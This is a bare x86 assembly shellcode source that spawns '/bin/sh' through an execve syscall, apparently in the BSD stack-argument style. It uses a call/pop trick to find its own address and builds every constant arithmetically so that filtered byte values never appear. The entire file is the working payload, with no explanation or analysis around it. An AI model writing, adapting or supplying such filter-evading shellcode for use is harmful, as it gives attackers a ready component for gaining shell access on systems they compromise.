global _start

section .text
_start:
	mov ax, next-0x123
	add ax, 0x123
	movzx eax, ax
	call eax
next:
	pop eax
	mov ebp, eax
	mov ax, 0x111
	sub ax, 0x101
	movzx eax, ax
	sub esp, eax
	mov dx, sh+0x123
	sub dx, next+0x123
	movzx edx, dx
	add edx, ebp
	xor eax, eax
	mov dword [esp+12], eax
	mov dword [esp+8], eax
	mov dword [esp+4], edx
	mov dword [esp], edx
	mov ax, 0x11a
	xor ax, 0x121
	int 0x80

	xor eax, eax
	mov dword [esp-16], eax
	mov ax, 0x123
	sub ax, 0x122
	int 0x80
	add sp, 0x111
	sub sp, 0x101
sh:
	db "/bin/sh", 0